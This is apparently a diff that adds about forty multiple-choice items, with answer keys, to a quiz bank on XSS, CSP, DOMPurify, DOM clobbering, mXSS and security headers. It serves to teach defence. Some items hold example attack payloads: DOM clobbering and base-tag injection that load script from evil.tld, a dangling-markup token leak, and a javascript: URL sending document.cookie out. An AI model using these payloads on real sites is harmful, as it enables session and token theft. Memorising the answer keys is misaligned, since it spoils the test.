@@ -936,3 +936,711 @@ questions:
     an injected <base> element from rewriting relative script URLs to an attacker origin.
     Both are standard hardening additions.
   ref: "concepts.md#content-security-policy-fundamentals"
+
+- id: xss-csp-and-security-headers-055
+  difficulty: expert
+  tags: [dom-clobbering, sanitizer-bypass]
+  question: |
+    A page runs strict, nonce-based CSP and DOMPurify strips all `<script>` tags and `on*`
+    event handlers, but allows `<a>` with `id`/`name`. The app later does
+    `s = document.createElement('script'); s.src = window.config.url; document.body.append(s)`.
+    Which injected payload achieves code execution?
+  options:
+  - "<img src=x onerror=alert(1)>"
+  - "<a id=config><a id=config name=url href=//evil.tld/x.js>"
+  - "<script nonce=guess>alert(1)</script>"
+  - "<svg><animate onbegin=alert(1)>"
+  answer: 1
+  explanation: |
+    This is DOM clobbering. Two same-id anchors form a collection and the nested `name=url`
+    exposes `window.config.url` as an attacker-controlled value, so the legitimate script
+    loader fetches evil.tld/x.js under the page's origin — no injected script needed. The
+    onerror/onload/nonce payloads are stripped or blocked by the sanitizer/CSP.
+  ref: "concepts.md#dom-clobbering"
+
+- id: xss-csp-and-security-headers-056
+  difficulty: advanced
+  tags: [dom-clobbering, defense]
+  question: |
+    Which DOMPurify configuration most directly defeats DOM clobbering attacks?
+  options:
+  - "ALLOWED_TAGS: ['script']"
+  - "RETURN_TRUSTED_TYPE: true"
+  - "SANITIZE_NAMED_PROPS: true"
+  - "SAFE_FOR_XML: false"
+  answer: 2
+  explanation: |
+    SANITIZE_NAMED_PROPS prefixes attacker-supplied id/name values with `user-content-`, so
+    they can no longer collide with real JavaScript properties/globals (window.x, form
+    properties). RETURN_TRUSTED_TYPE is for Trusted Types integration, and SAFE_FOR_XML:
+    false actually weakens protection.
+  ref: "concepts.md#dom-clobbering"
+
+- id: xss-csp-and-security-headers-057
+  difficulty: expert
+  tags: [dom-clobbering, filter-bypass]
+  question: |
+    A sanitizer iterates `for (const a of node.attributes) { ... }` to inspect each
+    attribute. How can an attacker inject markup that breaks this loop to slip past the
+    filter?
+  options:
+  - "Inject <form><input id=attributes> so form.attributes is clobbered and no longer a NamedNodeMap"
+  - "Inject a very long attribute value to exhaust memory"
+  - "Inject a Unicode BOM at the start of the attribute"
+  - "Inject an attribute name containing a null byte"
+  answer: 0
+  explanation: |
+    Clobbering the `attributes` property (via a named form control with id=attributes)
+    replaces the expected NamedNodeMap with an element reference, so the iteration throws or
+    misbehaves and the filter loop is defeated. The defense is verifying
+    `node.attributes instanceof NamedNodeMap` before trusting it.
+  ref: "concepts.md#dom-clobbering"
+
+- id: xss-csp-and-security-headers-058
+  difficulty: expert
+  tags: [mxss, parser]
+  question: |
+    What is the root cause that makes mutation XSS (mXSS) possible against an otherwise
+    correct HTML sanitizer?
+  options:
+  - "The browser HTML parser is not idempotent: re-serializing and re-parsing sanitizer-approved markup can mutate it into executable markup"
+  - "The sanitizer runs on the server instead of the client"
+  - "The sanitizer uses a blocklist instead of an allowlist"
+  - "TLS renegotiation corrupts the sanitized string in transit"
+  answer: 0
+  explanation: |
+    mXSS arises because assigning to innerHTML parses markup, and later re-serialization/
+    normalization/reinsertion can transform sanitizer-approved nodes into a different,
+    executable shape. The sanitizer inspected the pre-mutation form. This is why sanitizer
+    output must never be re-serialized or post-processed.
+  ref: "concepts.md#mutation-xss-mxss-internals"
+
+- id: xss-csp-and-security-headers-059
+  difficulty: expert
+  tags: [mxss, namespace-confusion]
+  question: |
+    Which markup construct is a classic mXSS engine because it switches the parser between
+    HTML and foreign-content parsing rules?
+  options:
+  - "<div class=\"svg\">...</div>"
+  - "<p data-svg=\"1\">...</p>"
+  - "<annotation-xml encoding=\"text/html\"> inside <math>, or <style> inside <svg>"
+  - "<span style=\"color:red\">...</span>"
+  answer: 2
+  explanation: |
+    SVG/MathML integration points (e.g. <svg><style>, <math><mtext>, and
+    <annotation-xml encoding="text/html">) parse content under different rules than HTML.
+    Re-serialization can move content across the namespace boundary so inert text becomes
+    live HTML — the core of modern DOMPurify mXSS bypasses (Mizu 2024).
+  ref: "concepts.md#mutation-xss-mxss-internals"
+
+- id: xss-csp-and-security-headers-060
+  difficulty: advanced
+  tags: [mxss, sanitizer-hygiene]
+  question: |
+    Your code does `el.innerHTML = DOMPurify.sanitize(input).replace(/foo/g, 'bar')`.
+    Why is this dangerous?
+  options:
+  - "String.replace is too slow for large inputs"
+  - "DOMPurify.sanitize returns a Promise that isn't awaited"
+  - "innerHTML always double-encodes entities"
+  - "Modifying the HTML after sanitizing can void the sanitization and re-open a mutation the sanitizer had neutralized"
+  answer: 3
+  explanation: |
+    Post-processing sanitizer output breaks its guarantee: the string edit can reintroduce a
+    parse mutation DOMPurify had removed. Sanitize once and assign the result directly to the
+    sink (ideally as TrustedHTML) with no further modification.
+  ref: "concepts.md#mutation-xss-mxss-internals"
+
+- id: xss-csp-and-security-headers-061
+  difficulty: expert
+  tags: [dompurify, trusted-types, config]
+  question: |
+    You set `DOMPurify.sanitize(x, { RETURN_TRUSTED_TYPE: true })` on a page enforcing
+    `require-trusted-types-for 'script'`. The call throws a Trusted Types policy error.
+    What is the most likely fix?
+  options:
+  - "Add `dompurify` to the CSP `trusted-types` directive so DOMPurify's auto-created policy is allowed"
+  - "Remove require-trusted-types-for entirely"
+  - "Switch RETURN_TRUSTED_TYPE to false and assign the raw string"
+  - "Set ALLOWED_TAGS to an empty array"
+  answer: 0
+  explanation: |
+    With RETURN_TRUSTED_TYPE, DOMPurify creates a Trusted Types policy named `dompurify`.
+    Trusted Types only permits policy names listed in the CSP `trusted-types` directive, so
+    it must include `dompurify`. Disabling Trusted Types or returning a raw string would
+    remove the protection you wanted.
+  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"
+
+- id: xss-csp-and-security-headers-062
+  difficulty: advanced
+  tags: [dompurify, server-side, config]
+  question: |
+    A team runs DOMPurify server-side for SSR. Which choice is UNSAFE for sanitization?
+  options:
+  - "Using jsdom and keeping it pinned and patched"
+  - "Applying a tight ALLOWED_TAGS/ALLOWED_ATTR allowlist"
+  - "Using SANITIZE_NAMED_PROPS to mitigate clobbering"
+  - "Using happy-dom as the DOM implementation for DOMPurify"
+  answer: 3
+  explanation: |
+    happy-dom is not a safe DOM backend for DOMPurify sanitization and has known gaps; a
+    patched jsdom (or a real browser build) is the supported path. The other options are
+    correct hardening choices.
+  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"
+
+- id: xss-csp-and-security-headers-063
+  difficulty: advanced
+  tags: [dompurify, use-profiles, pitfall]
+  question: |
+    A developer sets both `ALLOWED_TAGS: ['b','i','a']` and `USE_PROFILES: { html: true }`
+    on the same DOMPurify call and is surprised many more tags are allowed than expected.
+    Why?
+  options:
+  - "Enabling USE_PROFILES overrides ALLOWED_TAGS, so the profile's broader tag set applies"
+  - "USE_PROFILES is ignored when ALLOWED_TAGS is present"
+  - "ALLOWED_TAGS only affects attributes, not tags"
+  - "The two options are additive and both fully apply"
+  answer: 0
+  explanation: |
+    USE_PROFILES overrides ALLOWED_TAGS — the profile's built-in tag list wins. To restrict
+    to a small custom set, use ALLOWED_TAGS/ALLOWED_ATTR without USE_PROFILES.
+  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"
+
+- id: xss-csp-and-security-headers-064
+  difficulty: expert
+  tags: [coop, coep, cross-origin-isolation]
+  question: |
+    A page needs `SharedArrayBuffer` and high-resolution `performance.now()`, both locked
+    down after Spectre. Which header combination re-enables them by achieving cross-origin
+    isolation?
+  options:
+  - "Strict-Transport-Security + X-Content-Type-Options: nosniff"
+  - "Cross-Origin-Opener-Policy: same-origin AND Cross-Origin-Embedder-Policy: require-corp"
+  - "Content-Security-Policy: sandbox + Referrer-Policy: no-referrer"
+  - "X-Frame-Options: DENY + Permissions-Policy: fullscreen=()"
+  answer: 1
+  explanation: |
+    COOP: same-origin plus COEP: require-corp make self.crossOriginIsolated true, which
+    re-enables SharedArrayBuffer, unthrottled performance.now(), and
+    measureUserAgentSpecificMemory(). The other headers don't grant cross-origin isolation.
+  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
+
+- id: xss-csp-and-security-headers-065
+  difficulty: advanced
+  tags: [coop, tabnabbing]
+  question: |
+    What is the primary security effect of `Cross-Origin-Opener-Policy: same-origin`?
+  options:
+  - "It encrypts the document's cookies"
+  - "It forces all subresources to load over HTTPS"
+  - "It severs window.opener so cross-origin pages you open (or that opened you) cannot script your window, closing reverse-tabnabbing and many XS-Leaks"
+  - "It blocks the page from being placed in an iframe"
+  answer: 2
+  explanation: |
+    COOP: same-origin isolates the browsing-context group and breaks the window.opener
+    relationship across origins, defeating reverse tabnabbing and cross-window leak/scripting
+    paths. Framing is controlled by frame-ancestors, not COOP.
+  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
+
+- id: xss-csp-and-security-headers-066
+  difficulty: advanced
+  tags: [corp, xssi]
+  question: |
+    What does `Cross-Origin-Resource-Policy: same-origin` on a response accomplish?
+  options:
+  - "It allows any origin to embed the resource"
+  - "It sets the resource's cookies to SameSite=Strict"
+  - "It tells the browser only same-origin documents may embed/load this resource, mitigating XSSI and side-channel leaks"
+  - "It upgrades the resource request to HTTPS"
+  answer: 2
+  explanation: |
+    CORP is a per-resource opt-in declaring who may embed it. `same-origin` blocks other
+    sites from loading the resource into <img>/<script>/etc., reducing cross-site inclusion
+    (XSSI) and Spectre-style read side channels.
+  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
+
+- id: xss-csp-and-security-headers-067
+  difficulty: expert
+  tags: [csp, unsafe-hashes]
+  question: |
+    Under a strict CSP you must keep one legacy inline `onclick="doThing()"` handler that
+    cannot be refactored right now. Which is the correct least-bad approach?
+  options:
+  - "Add 'unsafe-inline' to script-src"
+  - "Add 'unsafe-hashes' with the SHA-256 hash of the handler body to script-src"
+  - "Add 'unsafe-eval' to script-src"
+  - "Add the page's origin to script-src"
+  answer: 1
+  explanation: |
+    'unsafe-hashes' allows specific inline event-handler/style attributes to run by hash
+    without enabling all inline script — far narrower than 'unsafe-inline'. It is weaker than
+    removing the handler (the right long-term fix), but it does not blanket-allow inline
+    script the way 'unsafe-inline'/'unsafe-eval' would.
+  ref: "concepts.md#advanced-csp-source-expressions"
+
+- id: xss-csp-and-security-headers-068
+  difficulty: expert
+  tags: [csp, script-src-attr]
+  question: |
+    You allow nonced `<script>` elements but want to guarantee NO inline event-handler
+    attributes (`onclick=`, `onload=`) ever execute, regardless of script-src. Which
+    directive expresses this?
+  options:
+  - "script-src-attr 'none'"
+  - "script-src-elem 'none'"
+  - "object-src 'none'"
+  - "default-src 'self'"
+  answer: 0
+  explanation: |
+    script-src-attr governs inline event-handler attributes specifically; setting it to
+    'none' blocks all inline handlers independent of script-src. script-src-elem governs
+    <script> elements (which you still want to allow via nonce).
+  ref: "concepts.md#advanced-csp-source-expressions"
+
+- id: xss-csp-and-security-headers-069
+  difficulty: advanced
+  tags: [csp, script-src-elem-attr]
+  question: |
+    What is the difference between `script-src-elem` and `script-src-attr`?
+  options:
+  - "-elem governs <script> elements (inline blocks and src loads); -attr governs inline event-handler attributes"
+  - "-elem governs HTTP, -attr governs HTTPS"
+  - "-elem is for CSS and -attr is for JavaScript"
+  - "They are aliases with identical behavior"
+  answer: 0
+  explanation: |
+    script-src-elem controls <script> elements; script-src-attr controls inline on* handler
+    attributes. When unset they fall back to script-src, then default-src. This granularity
+    lets you permit nonced script elements while banning inline handlers.
+  ref: "concepts.md#advanced-csp-source-expressions"
+
+- id: xss-csp-and-security-headers-070
+  difficulty: expert
+  tags: [csp, script-gadgets]
+  question: |
+    A CSP uses `'nonce-...' 'strict-dynamic'` and scores highly in CSP Evaluator, yet an
+    attacker who can inject non-script HTML still runs code. Which mechanism most likely
+    explains this?
+  options:
+  - "The nonce was too long"
+  - "strict-dynamic disables the nonce"
+  - "The browser ignored the CSP because it was sent as a meta tag"
+  - "A script gadget in an already-trusted bundle (e.g. an AngularJS {{ }} expression or a JSONP callback) turns injected benign markup into execution"
+  answer: 3
+  explanation: |
+    strict-dynamic trusts scripts loaded by trusted code, but if a trusted bundle contains a
+    script gadget (AngularJS template evaluation, a JSONP callback, framework auto-init), the
+    attacker's injected HTML supplies data the gadget executes — no injected <script> needed.
+    Gadget-auditing trusted bundles is required even under strict-dynamic.
+  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"
+
+- id: xss-csp-and-security-headers-071
+  difficulty: expert
+  tags: [csp, dangling-markup, exfiltration]
+  question: |
+    CSP blocks all script execution, but `img-src` and `connect-src` allow arbitrary hosts.
+    An attacker injects `<img src='//evil.tld/log?` (unterminated) before a page region
+    containing a CSRF token. What happens?
+  options:
+  - "The CSP blocks the injection entirely"
+  - "Nothing — img-src has no security relevance"
+  - "The browser treats the following page markup (including the CSRF token) as the attribute value and sends it to evil.tld when it fetches the image"
+  - "The token is automatically HTML-encoded and safe"
+  answer: 2
+  explanation: |
+    This is dangling-markup injection: the unterminated attribute swallows subsequent page
+    content (the token) up to the next matching quote, and the browser exfiltrates it in the
+    image request URL. CSP script blocking doesn't stop it; img-src 'self' helps but the real
+    fix is fixing the HTML injection.
+  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"
+
+- id: xss-csp-and-security-headers-072
+  difficulty: expert
+  tags: [csp, policy-injection]
+  question: |
+    An app reflects a user-supplied value into the `Content-Security-Policy` header it
+    emits. How can an attacker abuse this "CSP policy injection"?
+  options:
+  - "By making the header longer than 8 KB so the browser drops it"
+  - "By appending a directive such as `; script-src-elem 'unsafe-inline'` that overrides the intended base script-src and re-enables inline script"
+  - "By changing the header name to X-CSP"
+  - "It cannot be abused; CSP headers are read-only to attackers"
+  answer: 1
+  explanation: |
+    If untrusted input lands in the CSP header, the attacker can inject a directive that
+    overrides the intended policy (e.g. a permissive script-src-elem), neutralizing
+    protection. Never construct CSP from untrusted input.
+  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"
+
+- id: xss-csp-and-security-headers-073
+  difficulty: expert
+  tags: [csp, base-uri, dom-clobbering]
+  question: |
+    A strict CSP uses nonces but references its scripts relatively, e.g.
+    `<script nonce=abc src="app.js">`, and omits `base-uri`. Why is this exploitable?
+  options:
+  - "Relative URLs are always blocked by CSP"
+  - "An injected `<base href='//evil.tld/'>` rewrites the relative script URL, so the nonced script loads from the attacker's origin"
+  - "Nonces don't work with relative URLs"
+  - "The browser will refuse to load app.js without a full URL"
+  answer: 1
+  explanation: |
+    Without base-uri 'none', an injected <base> element changes the base for relative URLs,
+    so the nonced <script src="app.js"> resolves to evil.tld/app.js and loads attacker code
+    with the page's trust. base-uri 'none' is a required hardening directive precisely for
+    this.
+  ref: "concepts.md#csp-bypasses-dangling-markup-policy-injection-and-script-gadgets"
+
+- id: xss-csp-and-security-headers-074
+  difficulty: advanced
+  tags: [csp, sandbox]
+  question: |
+    You must serve untrusted user-uploaded HTML with minimal capability. What does an empty
+    `Content-Security-Policy: sandbox` (no tokens) do?
+  options:
+  - "It disables CSP for that response"
+  - "It runs the document as an opaque unique origin with scripts, forms, popups, and same-origin access all disabled (maximum restriction)"
+  - "It allows scripts but blocks images"
+  - "It only affects iframes that embed the document, not the document itself"
+  answer: 1
+  explanation: |
+    The CSP sandbox directive applies iframe-style sandboxing to the response itself; with no
+    tokens it is maximally restrictive (opaque origin, no scripts/forms/popups/same-origin).
+    You add back capabilities with tokens like allow-scripts, allow-forms as needed — but
+    avoid allow-scripts + allow-same-origin together for untrusted content.
+  ref: "concepts.md#sandbox-upgrade-insecure-requests-and-mixed-content"
+
+- id: xss-csp-and-security-headers-075
+  difficulty: advanced
+  tags: [csp, upgrade-insecure-requests, hsts]
+  question: |
+    Which statement about `upgrade-insecure-requests` is correct?
+  options:
+  - "It is a full replacement for HSTS"
+  - "It downgrades https to http for performance"
+  - "It only applies to WebSocket connections"
+  - "It auto-upgrades http subresource/same-origin nav URLs to https, but does not upgrade cross-origin top-level navigations and is not a substitute for HSTS"
+  answer: 3
+  explanation: |
+    upgrade-insecure-requests rewrites http:// subresource and same-origin navigation URLs to
+    https:// to fix mixed content, but it doesn't upgrade cross-origin top-level navigations
+    and provides no first-request MITM protection — HSTS (ideally preloaded) is still
+    required.
+  ref: "concepts.md#sandbox-upgrade-insecure-requests-and-mixed-content"
+
+- id: xss-csp-and-security-headers-076
+  difficulty: advanced
+  tags: [reporting-api, headers]
+  question: |
+    In the modern Reporting API v1, how do you direct CSP violation reports to an endpoint?
+  options:
+  - "Set a `Report-To` header and reference it with CSP `report-uri`"
+  - "Set a `Reporting-Endpoints` header and reference the named group with the CSP `report-to` directive"
+  - "Set a `X-Report` header only"
+  - "Reports are sent automatically to the origin root; no configuration is possible"
+  answer: 1
+  explanation: |
+    Reporting API v1 uses the `Reporting-Endpoints` response header defining named endpoints,
+    referenced from CSP via the `report-to <group>` directive. `Report-To` is the older name
+    it supersedes; `report-uri` is deprecated but often sent alongside for compatibility.
+  ref: "concepts.md#modern-reporting-api-reporting-endpoints-and-nel"
+
+- id: xss-csp-and-security-headers-077
+  difficulty: advanced
+  tags: [csp, report-sample]
+  question: |
+    What does the `'report-sample'` keyword in a CSP source list do?
+  options:
+  - "It samples only 1% of violations to reduce report volume"
+  - "It disables reporting for sampled requests"
+  - "It reports only same-origin violations"
+  - "It tells the browser to include a short snippet of the offending inline script in the violation report to aid triage"
+  answer: 3
+  explanation: |
+    'report-sample' asks the browser to add a small sample of the blocked inline
+    script/handler content to the violation report, which helps developers identify what was
+    blocked. It is not about statistical sampling of report volume.
+  ref: "concepts.md#modern-reporting-api-reporting-endpoints-and-nel"
+
+- id: xss-csp-and-security-headers-078
+  difficulty: expert
+  tags: [js-context, script-breakout]
+  question: |
+    Untrusted data is placed inside `<script>var name='DATA';</script>` and the developer
+    backslash-escapes quotes in DATA. Why can this still be XSS?
+  options:
+  - "Backslash escaping is not supported in JavaScript"
+  - "The HTML parser acts before the JS lexer, so a literal </script> inside DATA closes the script element; you must also encode < > &, or emit via JSON.parse/data attribute"
+  - "var declarations are hoisted, exposing the value"
+  - "Single quotes are not valid string delimiters in JS"
+  answer: 1
+  explanation: |
+    Escaping quotes alone is insufficient: HTML parsing precedes JS lexing, so a </script>
+    sequence in the value terminates the script block regardless of JS escaping. Encode
+    <, >, & (e.g. <) or, better, emit the value as JSON and JSON.parse it, or pass it via
+    a data-* attribute.
+  ref: "concepts.md#javascript-and-json-context-escaping"
+
+- id: xss-csp-and-security-headers-079
+  difficulty: expert
+  tags: [json-in-html, escaping]
+  question: |
+    When embedding a JSON blob inside an HTML `<script>` element, which characters must be
+    escaped (e.g. as \u00XX) to be safe across both the HTML parser and the JS string
+    grammar?
+  options:
+  - "Only double quotes"
+  - "< > & and the line terminators U+2028 / U+2029"
+  - "Only backslashes"
+  - "Only whitespace characters"
+  answer: 1
+  explanation: |
+    < enables </script> breakout in the HTML parser; > and & are encoded for safety; and
+    U+2028/U+2029 are valid in JSON but historically illegal in JS string literals (breaking
+    older parsers). Encoding these keeps the embedded JSON safe in both grammars.
+  ref: "concepts.md#javascript-and-json-context-escaping"
+
+- id: xss-csp-and-security-headers-080
+  difficulty: advanced
+  tags: [xssi, json-hijacking]
+  question: |
+    Why do some APIs prefix JSON responses with `)]}',\n` or `while(1);`?
+  options:
+  - "To compress the payload"
+  - "To signal the API version"
+  - "To satisfy a CORS preflight requirement"
+  - "As an anti-XSSI/JSON-hijacking guard so the body cannot be executed as a <script>; legitimate clients strip the prefix, and it pairs with nosniff + correct Content-Type"
+  answer: 3
+  explanation: |
+    The prefix makes the response non-executable if included cross-origin via <script>
+    (defeating JSON hijacking of top-level arrays). Clients strip it before parsing. It works
+    alongside X-Content-Type-Options: nosniff and a correct JSON Content-Type.
+  ref: "concepts.md#javascript-and-json-context-escaping"
+
+- id: xss-csp-and-security-headers-081
+  difficulty: expert
+  tags: [nonce, caching, cdn]
+  question: |
+    A team puts a nonce-based CSP on pages that are fully cached at the CDN and served
+    identically to all users. Why does this destroy the nonce's protection, and what is the
+    right fix?
+  options:
+  - "It doesn't; cached nonces are fine"
+  - "Nonces break caching entirely so the page won't load — switch to unsafe-inline"
+  - "The cached nonce is now static/public so an attacker reads and reuses it — use hash-based CSP for static pages or inject a fresh nonce per request at the edge"
+  - "CDNs strip CSP headers — move CSP to a meta tag"
+  answer: 2
+  explanation: |
+    A nonce must be fresh and unpredictable per response; a cached page freezes it, so it is
+    readable and reusable by an attacker and provides no protection. For cacheable/static
+    pages use hash-based CSP (pins exact bytes) or generate the nonce per request at the edge
+    and rewrite header + tags.
+  ref: "concepts.md#nonces-caching-and-cdn-interaction"
+
+- id: xss-csp-and-security-headers-082
+  difficulty: advanced
+  tags: [nonce, middleware, pitfall]
+  question: |
+    Why is middleware that automatically stamps the CSP nonce onto EVERY `<script>` tag in
+    the rendered output dangerous?
+  options:
+  - "It slows down rendering"
+  - "Nonces cannot legally appear on more than one tag"
+  - "It would also add the nonce to scripts built from user data, re-blessing an injected script and defeating the policy"
+  - "It forces all scripts to load synchronously"
+  answer: 2
+  explanation: |
+    Blindly noncing all script tags means an injected/attacker-influenced <script> also gets
+    a valid nonce and executes. Nonces must be applied only to known-trusted, server-authored
+    tags — never to markup derived from untrusted input.
+  ref: "concepts.md#nonces-caching-and-cdn-interaction"
+
+- id: xss-csp-and-security-headers-083
+  difficulty: advanced
+  tags: [self-xss, social-engineering]
+  question: |
+    Why can output encoding NOT fix "self-XSS" where a user is tricked into pasting attacker
+    JavaScript into their browser DevTools console?
+  options:
+  - "Because the console encrypts pasted input"
+  - "Because encoding only works on the server"
+  - "Because DevTools disables CSP"
+  - "Because there is no injection point in the application — it is social engineering; defenses are user education, console warnings, and UX, not encoding"
+  answer: 3
+  explanation: |
+    Self-XSS has no application injection vector; the user runs the code themselves in their
+    own session. Encoding/CSP can't intercept a manual console paste. Mitigations are browser
+    console warnings, user education, and avoiding 'paste this code' affordances.
+  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"
+
+- id: xss-csp-and-security-headers-084
+  difficulty: advanced
+  tags: [url-scheme, javascript-url]
+  question: |
+    A React app renders `<a href={userUrl}>`. An attacker sets userUrl to
+    `javascript:fetch('//evil?'+document.cookie)`. What is the correct fix?
+  options:
+  - "Rely on React's auto-escaping, which blocks all javascript: URLs by default"
+  - "HTML-encode the URL before rendering"
+  - "Scheme-allowlist the URL: permit only http/https/mailto/relative and reject others before assigning it to href"
+  - "Add rel=noopener to the anchor"
+  answer: 2
+  explanation: |
+    React's text auto-escaping does not neutralize a javascript: URL in an href/src; the fix
+    is validating the scheme against an allowlist (https/http/mailto/relative) and rejecting
+    javascript:/data: before rendering. rel=noopener addresses tabnabbing, not this.
+  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"
+
+- id: xss-csp-and-security-headers-085
+  difficulty: intermediate
+  tags: [tabnabbing, target-blank]
+  question: |
+    A link opens with `target="_blank"`. What attribute prevents the opened page from using
+    `window.opener` to redirect the original tab (reverse tabnabbing)?
+  options:
+  - "rel=\"noopener noreferrer\""
+  - "download"
+  - "referrerpolicy=\"unsafe-url\""
+  - "loading=\"lazy\""
+  answer: 0
+  explanation: |
+    rel="noopener" nulls window.opener in the opened page, and noreferrer also strips the
+    Referer; together they block reverse tabnabbing. Modern browsers imply noopener for
+    target=_blank, but setting it explicitly (or COOP: same-origin at the document level) is
+    best practice.
+  ref: "concepts.md#self-xss-javascriptdata-urls-and-reverse-tabnabbing"
+
+- id: xss-csp-and-security-headers-086
+  difficulty: expert
+  tags: [doubleclickjacking, clickjacking]
+  question: |
+    Why does "DoubleClickjacking" (2024) bypass both `frame-ancestors`/X-Frame-Options AND
+    SameSite cookies?
+  options:
+  - "It disables the headers with a CSP injection"
+  - "It brute-forces the CSRF token during the double-click"
+  - "The victim's second click lands on a top-level, unframed, same-site authenticated window swapped in between mousedown/mouseup, so framing headers and SameSite never engage"
+  - "It only works when HSTS is absent"
+  answer: 2
+  explanation: |
+    DoubleClickjacking uses double-click/window-swap timing so the sensitive action occurs in
+    a top-level (not iframed), same-site window that is already authenticated. Since there is
+    no cross-site framing and no cross-site request, frame-ancestors and SameSite don't apply.
+    Defenses: delay/disable critical buttons after focus, require explicit confirmation, use
+    COOP.
+  ref: "concepts.md#doubleclickjacking-and-the-limits-of-framing-defenses"
+
+- id: xss-csp-and-security-headers-087
+  difficulty: expert
+  tags: [cve, supply-chain, pdfjs]
+  question: |
+    CVE-2024-4367 in Mozilla's pdf.js allowed arbitrary JavaScript execution via a crafted
+    font. What broader lesson does it illustrate for appsec?
+  options:
+  - "PDFs are always safe to render inline"
+  - "CSP fully prevents all library vulnerabilities"
+  - "Font files cannot contain executable logic"
+  - "Second-order/supply-chain XSS: a flaw in an embedded rendering library becomes XSS in your origin, so dependency patching and scanning are the control"
+  answer: 3
+  explanation: |
+    A missing type check in an embedded library (pdf.js) executed attacker JS in the
+    embedding origin — XSS you didn't write. The takeaway is that third-party/embedded code is
+    part of your attack surface; keep dependencies patched and scanned (and sandbox untrusted
+    rendering).
+  ref: "concepts.md#notable-cves-and-incidents"
+
+- id: xss-csp-and-security-headers-088
+  difficulty: expert
+  tags: [csp, localstorage, limits]
+  question: |
+    A React SPA enforces strict nonce CSP but stores a bearer token in localStorage. A
+    DOM-XSS bug is found. Does CSP prevent the token from being stolen?
+  options:
+  - "Yes — strict CSP blocks all token access"
+  - "Yes — nonces encrypt localStorage"
+  - "No — CSP restricts script sources/execution, not DOM reads of same-origin localStorage; you'd need Trusted Types to close the DOM sink, and connect-src 'self' won't stop exfil via your own origin/open redirect/gadget"
+  - "No, but only because the token isn't HttpOnly-eligible in a SPA"
+  answer: 2
+  explanation: |
+    CSP governs what scripts run and load, not what already-running same-origin code reads
+    from localStorage. DOM-XSS can read the token; closing DOM sinks needs Trusted Types, and
+    connect-src 'self' can be bypassed via same-origin gadgets/open redirects. This is the
+    core HttpOnly-cookie vs localStorage-token argument.
+  ref: "concepts.md#notable-cves-and-incidents"
+
+- id: xss-csp-and-security-headers-089
+  difficulty: expert
+  tags: [headers, hardening, scenario]
+  question: |
+    Which header set best matches a fully-hardened 2025 app that also needs cross-origin
+    isolation?
+  options:
+  - "script-src 'unsafe-inline'; X-Frame-Options: ALLOW-FROM *; Referrer-Policy: unsafe-url"
+  - "CSP nonce + 'strict-dynamic' + object-src 'none' + base-uri 'none' + frame-ancestors 'none' + require-trusted-types-for 'script'; HSTS preload; nosniff; Referrer-Policy: strict-origin-when-cross-origin; COOP same-origin + COEP require-corp; Permissions-Policy deny-list; Reporting-Endpoints + report-to"
+  - "default-src *; Strict-Transport-Security: max-age=0; Permissions-Policy: camera=*"
+  - "Only Content-Security-Policy: default-src 'self'"
+  answer: 1
+  explanation: |
+    The strong baseline: strict nonce + strict-dynamic CSP with object-src/base-uri/
+    frame-ancestors 'none' and Trusted Types; HSTS preload; nosniff; a tight Referrer-Policy;
+    COOP+COEP for isolation; a deny-list Permissions-Policy; and modern reporting. The other
+    options rely on unsafe-inline, wildcards, ALLOW-FROM, or max-age=0 (which unsets HSTS).
+  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
+
+- id: xss-csp-and-security-headers-090
+  difficulty: expert
+  tags: [correct-fix, scenario]
+  question: |
+    Match each case to the correct primary defense: (a) a search term reflected into the
+    HTML body, (b) a WYSIWYG rich-text bio, (c) a #hash value assigned to innerHTML.
+  options:
+  - "(a) sanitize with DOMPurify, (b) output-encode, (c) block-list the hash"
+  - "(a) context-aware output encoding, (b) HTML sanitization (+ Trusted Types), (c) use a safe sink like textContent (+ Trusted Types)"
+  - "(a) Trusted Types only, (b) URL-encode, (c) server-side encoding"
+  - "(a) input length limit, (b) CSP nonce, (c) HttpOnly cookie"
+  answer: 1
+  explanation: |
+    (a) A reflected plain-text value needs context-aware output encoding. (b) Rich text that
+    must contain HTML needs sanitization (DOMPurify), ideally wired to Trusted Types. (c) A
+    client-side hash→sink flow is fixed by using a safe sink (textContent) or sanitizing,
+    enforced by Trusted Types — server encoding can't help since the fragment never reaches
+    the server.
+  ref: "concepts.md#configuring-an-html-sanitizer-dompurify"
+
+- id: xss-csp-and-security-headers-091
+  difficulty: advanced
+  tags: [hsts, edge-cases]
+  question: |
+    Which statement about HSTS edge cases is CORRECT?
+  options:
+  - "HSTS stops a network attacker from setting a forged cookie on a sibling subdomain"
+  - "Preload-list removal is instantaneous"
+  - "includeSubDomains can amplify a subdomain-takeover risk, HSTS does not prevent cookie-integrity attacks from a subdomain, and max-age=0 unsets the policy"
+  - "HSTS is honored even when sent over plain HTTP"
+  answer: 2
+  explanation: |
+    HSTS protects transport confidentiality/integrity of the connection but not cookie
+    integrity — a network attacker controlling a subdomain can still set cookies on the parent.
+    includeSubDomains widens exposure to subdomain takeover, preload removal takes months, and
+    max-age=0 clears the stored policy. HSTS is ignored over plain HTTP.
+  ref: "concepts.md#hsts-and-preload"
+
+- id: xss-csp-and-security-headers-092
+  difficulty: advanced
+  tags: [coep, credentialless]
+  question: |
+    Under `Cross-Origin-Embedder-Policy: require-corp`, what must a cross-origin subresource
+    do to be embeddable?
+  options:
+  - "Nothing; require-corp allows all cross-origin resources"
+  - "Be served over HTTP/3"
+  - "Explicitly opt in via CORP (Cross-Origin-Resource-Policy) or CORS; otherwise the browser blocks it"
+  - "Include an X-Frame-Options header"
+  answer: 2
+  explanation: |
+    COEP: require-corp forces every cross-origin subresource to opt in — via a CORP header
+    (e.g. cross-origin) or CORS — or it is blocked. This opt-in requirement is what makes
+    cross-origin isolation safe. The `credentialless` variant instead loads such resources
+    without credentials.
+  ref: "concepts.md#cross-origin-isolation-coop-coep-and-corp"
